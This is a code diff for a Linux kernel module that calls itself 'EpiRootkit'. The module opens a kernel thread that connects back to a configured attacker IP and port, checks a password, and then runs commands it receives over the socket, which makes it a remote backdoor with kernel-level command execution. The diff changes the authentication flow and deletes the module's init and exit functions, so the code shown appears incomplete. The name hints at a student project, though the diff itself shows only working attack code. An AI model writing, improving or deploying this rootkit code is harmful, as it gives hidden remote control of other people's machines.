@@ -64,11 +64,11 @@ static int check_password(const char *input)
     kfree(shash);
     crypto_free_shash(tfm);
 
-    // Convert hash to hex string
+    /* Convert hash to hex string */
     for (i = 0; i < 32; i++)
         sprintf(hex_result + i * 2, "%02x", result[i]);
-
     hex_result[64] = '\0';
+
     return strncmp(hex_result, password_sha256, 64) == 0;
 }
 
@@ -161,38 +161,25 @@ static int connection_worker(void *data)
     struct sockaddr_in addr;
     int               ret;
     char             *cmd;
-    int authenticated = 0; 
 
-    /* allocate cmd buffer here to avoid mixed declarations */
+    /* allocate cmd buffer */
     cmd = kmalloc(CMD_MAX_LEN + 1, GFP_KERNEL);
     if (!cmd)
         return -ENOMEM;
 
     while (!kthread_should_stop()) {
-
-	if (!authenticated) {
-    		if (!check_password(cmd)) {
-    		    pr_warn("[waystar] Wrong password attempt.\n");
-    		    break;
-    		}
-    authenticated = 1;
-    pr_info("[waystar] Authenticated successfully.\n");
-    continue;
-}
-        /* create socket */
+        /* create socket and connect first */
         ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
         if (ret < 0) {
             pr_err("[EpiRootkit] sock_create failed: %d\n", ret);
             goto retry;
         }
 
-        /* setup address */
         memset(&addr, 0, sizeof(addr));
         addr.sin_family      = AF_INET;
         addr.sin_addr.s_addr = in_aton(attacker_ip);
         addr.sin_port        = htons(attacker_port);
 
-        /* connect */
         ret = kernel_connect(conn_sock,
                              (struct sockaddr *)&addr,
                              sizeof(addr), 0);
@@ -201,8 +188,29 @@ static int connection_worker(void *data)
             sock_release(conn_sock);
             goto retry;
         }
-        pr_info("[EpiRootkit] Connected to %s:%d\n",
-                attacker_ip, attacker_port);
+        pr_info("[EpiRootkit] Connected to %pI4:%d\n",
+                &addr.sin_addr, attacker_port);
+
+        /* one-shot password read & auth */
+        {
+            uint32_t net_len;
+            int plen;
+
+            if (sock_recv_all(conn_sock, &net_len, sizeof(net_len)) <= 0)
+                goto disconnect;
+            plen = ntohl(net_len);
+            if (plen <= 0 || plen > CMD_MAX_LEN)
+                goto disconnect;
+            if (sock_recv_all(conn_sock, cmd, plen) <= 0)
+                goto disconnect;
+            cmd[plen] = '\0';
+
+            if (!check_password(cmd)) {
+                pr_warn("[EpiRootkit] Wrong password.\n");
+                goto disconnect;
+            }
+            pr_info("[EpiRootkit] Authenticated successfully.\n");
+        }
 
         /* command loop */
         while (!kthread_should_stop()) {
@@ -217,7 +225,6 @@ static int connection_worker(void *data)
             if (len <= 0 || len > CMD_MAX_LEN)
                 break;
 
-            /* recv the command */
             if (sock_recv_all(conn_sock, cmd, len) <= 0)
                 break;
             cmd[len] = '\0';
@@ -226,37 +233,8 @@ static int connection_worker(void *data)
             execute_and_capture(cmd);
         }
 
+    disconnect:
         sock_release(conn_sock);
+
     retry:
         ssleep(5);
-    }
-
-    kfree(cmd);
-    return 0;
-}
-
-static int __init epirootkit_init(void)
-{
-    pr_info("[EpiRootkit] Initializing...\n");
-    conn_thread = kthread_run(connection_worker,
-                              NULL, "epirootkit_conn");
-    if (IS_ERR(conn_thread)) {
-        pr_err("[EpiRootkit] Thread start failed\n");
-        return PTR_ERR(conn_thread);
-    }
-    pr_info("[EpiRootkit] Module loaded.\n");
-    return 0;
-}
-
-static void __exit epirootkit_exit(void)
-{
-    pr_info("[EpiRootkit] Exiting...\n");
-    if (conn_thread)
-        kthread_stop(conn_thread);
-    if (conn_sock)
-        sock_release(conn_sock);
-    pr_info("[EpiRootkit] Unloaded.\n");
-}
-
-module_init(epirootkit_init);
-module_exit(epirootkit_exit);
